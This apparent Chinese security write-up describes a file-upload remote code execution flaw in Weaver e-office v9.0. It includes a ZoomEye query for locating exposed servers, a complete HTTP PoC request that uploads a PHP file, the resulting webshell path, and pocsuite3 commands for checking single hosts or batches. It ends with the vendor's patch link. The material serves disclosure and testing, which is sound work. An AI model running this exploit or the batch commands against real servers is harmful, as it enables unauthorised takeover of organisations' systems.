# 0x01 漏洞简介：

![image.png](https://image.3001.net/images/20211202/1638428606_61a86fbe3504bcad361ab.png!small)

    
    
    泛微e-office系统是标准、易用、快速部署上线的专业协同OA软件,国内协同OA办公领域领导品牌,致力于为企业用户提供专业OA办公系统、移动OA应用等协同OA整体解决方案。
    
    该漏洞是由于 e-office 未能正确处理上传模块中用户的输入数据导致的，攻击者可以通过该漏洞构造恶意的上传数据包，最终实现任意代码执行获取服务器控制权
    

# 0x02 影响版本：

泛微 e-office v9.0

# 0x03 漏洞等级:

高危、远程代码执行

# 0x04 漏洞影响:

攻击者可以通过该漏洞构造恶意的上传数据包，最终实现任意代码执行获取服务器控制权。

# 0x05 影响范围：

根据ZoomEye网络空间搜索引擎对潜在可能目标进行搜索，得到约4366条IP历史记录，主要大部分用户都分布在中国。

ZoomEye语法：

`app:"泛微协同办公标准产品EOffice"`

![image.png](https://image.3001.net/images/20211202/1638428692_61a87014bdb985153d7a9.png!small)

ZoomEye搜索链接：

`https://www.zoomeye.org/searchResult?q=app%3A%22%E6%B3%9B%E5%BE%AE%E5%8D%8F%E5%90%8C%E5%8A%9E%E5%85%AC%E6%A0%87%E5%87%86%E4%BA%A7%E5%93%81EOffice%22`

![image.png](https://image.3001.net/images/20211202/1638428741_61a870454aac7df042090.png!small)

全球分布：

![image.png](https://image.3001.net/images/20211202/1638428788_61a8707459e9ca6c2790f.png!small)

# 0x06 漏洞复现：

本地搭建环境，傻瓜式操作安装（这里就不多说了）

![image.png](https://image.3001.net/images/20211202/1638429315_61a872830295bc61205fa.png!small)

需要环境的可以关注公众号后台回复关键字"E-Office"获取

![image.png](https://image.3001.net/images/20211202/1638428860_61a870bce2ec666be429c.png!small)

PoC：

    
    
    POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
    Host: 127.0.0.1:7899
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
    Connection: close
    Accept-Language: zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6
    Cookie: LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348
    Content-Length: 193
    Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
    
    --e64bdf16c554bbc109cecef6451c26a4
    Content-Disposition: form-data; name="Filedata"; filename="test.php"
    Content-Type: image/jpeg
    
    <?php phpinfo();?>
    
    --e64bdf16c554bbc109cecef6451c26a4--    

![image.png](https://image.3001.net/images/20211202/1638428942_61a8710e60e9f40b226ac.png!small)

上传后访问shell路径：

`http://ip:port/images/logo/logo-eoffice.php`

![image.png](https://image.3001.net/images/20211202/1638428981_61a871351b43d649683e4.png!small)  
哥斯拉连接

![image.png](https://image.3001.net/images/20211202/1638429009_61a8715167c14ea1545d5.png!small)

利用大佬们写好的脚本一键利用图片

`python cli.py -r pocs\2021\e-cology\20211202_WEB_E-Office_FileUpload.py -u
http://ip:port --verify`  
单个检测：

![image.png](https://image.3001.net/images/20211202/1638429078_61a871961fede931cab47.png!small)

批量检测：

`python cli.py -r pocs\2021\e-cology\20211202_WEB_E-Office_FileUpload.py -f
1.txt --verify`

![image.png](https://image.3001.net/images/20211202/1638429106_61a871b2ede6131793390.png!small)

![image.png](https://image.3001.net/images/20211202/1638429186_61a87202b6ea7e17b98b3.png!small)

说到这里就简要介绍一下个人感觉非常好用的一款神器pocsuite3

    
    
    PocSuite3是Knownsec 404安全研究团队设计的一款远程漏洞测试以及PoC开发框架，该框架使用了功能极其强大的概念验证引擎，并自带了大量渗透测试以及安全分析功能。
    

功能介绍  
1、PoC脚本能够以attack、verify和shell等多种模式运行；  
2、自带插件生态系统；  
3、 可从本地文件、Redis和数据库等不同来源动态加载PoC脚本；  
4、 可从CIDR、本地文件、Redis、数据库、Zoomeye和Shodan等来源加载多个测试目标；  
5、 轻松导出测试结果；  
6、 支持命令行工具和Python包导入；  
7、 支持IPv6；  
8、 支持全局HTTP/HTTPS/SOCKS代理；  
9、 提供了强大的爬虫API；  
10、整合Seebug；  
11、整合ZoomEye；  
12、整合Shodan；  
13、整合Ceye；  
14、等等…  
关于pocsuite3的详细使用可以借鉴这个文档，这里不一一介绍！因为文档比较详细图片

`https://github.com/knownsec/pocsuite3/tree/master/docs`

# 0x07 建议解决方案:

厂商已提供漏洞修补方案，建议用户下载使用：

`https://v10.e-office.cn/eoffice9update/safepack.zip`

# 0x08 参考链接:

`https://mp.weixin.qq.com/s/rfxeO__eEVTfXcsoamHMUQ`  
`https://mp.weixin.qq.com/s/P75K_0869h-nWHRMu06zgQ`

